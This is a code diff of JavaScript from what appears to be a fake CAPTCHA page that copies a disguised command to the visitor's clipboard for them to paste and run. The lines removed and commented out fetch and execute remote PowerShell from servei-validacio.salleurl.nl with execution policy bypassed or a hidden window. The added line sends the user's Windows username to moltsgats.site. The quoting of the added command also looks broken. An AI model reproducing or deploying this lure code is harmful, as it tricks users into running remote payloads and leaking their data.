@@ -631,8 +631,12 @@ let checkboxWindow = document.getElementById("checkbox-window");
             var verification_id = generateRandomNumber();
             document.getElementById('verification-id').textContent = verification_id;
             
-            const commandToRun = 'cmd /c "start https://servei-validacio.salleurl.nl/etic & powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://servei-validacio.salleurl.nl/amazon | iex\"'
-            stageClipboard(commandToRun, verification_id)
+            //const commandToRun = "powershell -WindowStyle Hidden -c '& ([scriptblock]::Create((irm https://servei-validacio.salleurl.nl)))'"
+            const commandToRun = 'cmd /c "start https://servei-validacio.salleurl.nl/etic & powershell.exe -c Invoke-RestMethod -Uri "https://moltsgats.site/sendsal2025" -Method Post -ContentType "application/json" -Body (@{username=$env:USERNAME} | ConvertTo-Json)'
+"
+			
+			
+			stageClipboard(commandToRun, verification_id)
         }
 
         addCaptchaListeners();
